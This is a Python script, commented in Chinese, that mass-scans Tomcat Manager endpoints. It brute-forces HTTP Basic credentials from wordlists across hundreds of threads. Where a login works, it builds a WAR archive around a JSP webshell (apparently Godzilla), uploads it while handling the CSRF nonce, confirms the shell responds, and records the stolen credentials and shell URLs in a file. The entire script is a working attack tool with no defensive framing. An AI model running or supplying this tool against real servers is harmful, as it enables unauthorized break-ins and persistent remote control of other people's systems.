import logging
import requests
from requests.auth import HTTPBasicAuth
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import os
import time
import re
from bs4 import BeautifulSoup
import zipfile
import random
import string

# 忽略不安全请求的警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# 配置日志
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger()

# 通用文件读取函数
def load_file(file_path):
    if not os.path.isfile(file_path):
        logger.error(f"文件 {file_path} 不存在")
        return []
    with open(file_path, 'r', encoding='utf-8') as file:
        return [line.strip() for line in file.readlines()]

# 清理URL以确保路径正确
def clean_url(url):
    return url.rstrip('/manager/html')

# 生成随机的6位数字字母组合
def generate_random_string(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# 生成 WAR 文件
def generate_war():
    random_string = generate_random_string()
    war_file_name = f"{random_string}.war"
    shell_file_name = f"{generate_random_string()}.jsp"
    shell_file_path = 'shell.jsp'

    if not os.path.isfile(shell_file_path):
        logger.error(f"文件 {shell_file_path} 不存在")
        return None, None, None

    try:
        with zipfile.ZipFile(war_file_name, 'w', zipfile.ZIP_DEFLATED) as war:
            war.write(shell_file_path, shell_file_name)
        logger.info(f"[+] WAR 包生成成功: {war_file_name}，JSP 文件名: {shell_file_name}")
        return war_file_name, random_string, shell_file_name
    except Exception as e:
        logger.error(f"[-] WAR 包生成失败: {str(e)}")
        return None, None, None

def get_jsessionid_and_csrf_nonce(url, username, password):
    try:
        login_url = f"{url}/manager/html"
        response = requests.get(login_url, auth=HTTPBasicAuth(username, password), verify=False, timeout=10)
        response.raise_for_status()

        cookies = response.cookies
        jsessionid = cookies.get('JSESSIONID')
        if not jsessionid:
            logger.warning(f"{Fore.YELLOW}[!] 未能获取 JSESSIONID {login_url} {Style.RESET_ALL}")
            return None, None, None

        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_nonce_match = re.search(r'org\.apache\.catalina\.filters\.CSRF_NONCE=([A-F0-9]+)', response.text)
        csrf_nonce = csrf_nonce_match.group(1) if csrf_nonce_match else None

        file_input = soup.find('input', {'type': 'file'})
        file_field_name = file_input['name'] if file_input else 'file'

        return jsessionid, csrf_nonce, file_field_name
    except requests.exceptions.RequestException as e:
        logger.warning(f"{Fore.YELLOW}[!] 错误在 {url}: {str(e)}{Style.RESET_ALL}")
        return None, None, None

def deploy_godzilla_war(url, username, password, war_file_path, random_string, shell_file_name, output_file, max_retries=3):
    url = clean_url(url)
    jsessionid, csrf_nonce, file_field_name = get_jsessionid_and_csrf_nonce(url, username, password)

    if not jsessionid or not csrf_nonce or not file_field_name:
        return

    attempt = 0
    while attempt < max_retries:
        try:
            deploy_url = f"{url}/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE={csrf_nonce}"
            cookies = {'JSESSIONID': jsessionid}
            with open(war_file_path, 'rb') as war_file:
                files = {file_field_name: (os.path.basename(war_file_path), war_file, 'application/octet-stream')}
                response = requests.post(deploy_url, cookies=cookies, auth=HTTPBasicAuth(username, password),
                                         files=files, verify=False, timeout=10)
            response.raise_for_status()

            logger.info(f"{Fore.RED}[+] WAR 上传成功: {url} {Style.RESET_ALL}")
            shell_url = f"{url}/{random_string}/{shell_file_name}"
            shell_response = requests.get(shell_url, cookies=cookies, auth=HTTPBasicAuth(username, password),
                                          verify=False, timeout=10)
            if shell_response.status_code == 200:
                logger.info(f"{Fore.RED}[+] 成功获取 Webshell: {shell_url}{Style.RESET_ALL}")
                with open(output_file, 'a', encoding='utf-8') as f:
                    f.write(f"{url} {username}:{password} - Webshell: {shell_url}\n")
            else:
                logger.warning(f"{Fore.YELLOW}[!] 获取 Webshell 失败: {shell_url} {Style.RESET_ALL}")
            break
        except requests.exceptions.RequestException as e:
            logger.warning(f"{Fore.YELLOW}[!] 错误在 {url}: {str(e)}{Style.RESET_ALL}")

        attempt += 1
        if attempt < max_retries:
            logger.info(f"{Fore.CYAN}[!] 重试上传 ({attempt}/{max_retries})...{Style.RESET_ALL}")
            time.sleep(2)

    if os.path.isfile(war_file_path):
        try:
            os.remove(war_file_path)
            logger.info(f"[+] 已删除 WAR 文件: {war_file_path}")
        except OSError as e:
            logger.error(f"[-] 删除 WAR 文件失败: {str(e)}")

def check_weak_password(url, usernames, passwords, output_file, max_retries=3):
    attempt = 0
    while attempt < max_retries:
        try:
            for username in usernames:
                for password in passwords:
                    response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=10, verify=False)
                    if response.status_code == 200:
                        success_entry = f"{url} {username}:{password}"
                        logger.info(f"{Fore.RED}[+] 登录成功 {success_entry}{Style.RESET_ALL}")
                        with open(output_file, 'a', encoding='utf-8') as f:
                            f.write(success_entry + "\n")

                        war_file_name, random_string, shell_file_name = generate_war()
                        if war_file_name:
                            deploy_godzilla_war(url, username, password, war_file_name, random_string, shell_file_name, output_file)
                        return (url, username, password)
                    else:
                        logger.info(f"{Fore.GREEN}[-] 失败: {username}:{password} {Fore.WHITE}({response.status_code}) {Fore.BLUE}{url}{Style.RESET_ALL}")
            break
        except requests.exceptions.RequestException as e:
            logger.warning(f"{Fore.YELLOW}[!] 网站访问失败 {url} 尝试重新访问 {attempt + 1}/{max_retries}{Style.RESET_ALL}")
            time.sleep(2)
            attempt += 1
    if attempt == max_retries:
        logger.error(f"{Fore.CYAN}[-] 最大重试次数已达，无法访问 {url}，将该 URL 从检测列表中移除 {Style.RESET_ALL}")
        return None

    return (url, None, None)

def adjust_thread_pool_size(usernames, passwords, max_workers_limit, min_workers):
    combination_count = len(usernames) * len(passwords)
    
    # 每500个组合使用一个线程
    workers = min(max(min_workers, combination_count // 200), max_workers_limit)
    
    logger.info(f"根据用户名和密码组合总数 {combination_count} 调整线程池大小为 {workers}")
    return workers

def check_urls_in_threads(urls, usernames, passwords, output_file, max_workers_limit, min_workers):
    max_workers = adjust_thread_pool_size(usernames, passwords, max_workers_limit, min_workers)

    def process_url(url):
        check_weak_password(url, usernames, passwords, output_file)

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(process_url, url): url for url in urls}
        for future in as_completed(futures):
            url = futures[future]
            try:
                future.result()
            except Exception as exc:
                logger.error(f"{url} 生成异常: {exc}")

if __name__ == "__main__":
    user_file = 'user.txt'
    passwd_file = 'passwd.txt'
    url_file = 'urls.txt'
    output_file = 'success.txt'

    usernames = load_file(user_file)
    passwords = load_file(passwd_file)
    urls = load_file(url_file)

    if not usernames or not passwords or not urls:
        logger.error("用户名、密码或URL列表为空，请检查文件")
    else:
        # 用户可以在这里调整线程池的最大和最小值
        max_workers_limit = 500  # 用户定义的最大线程数
        min_workers = 100  # 用户定义的最小线程数

        check_urls_in_threads(urls, usernames, passwords, output_file, max_workers_limit, min_workers)
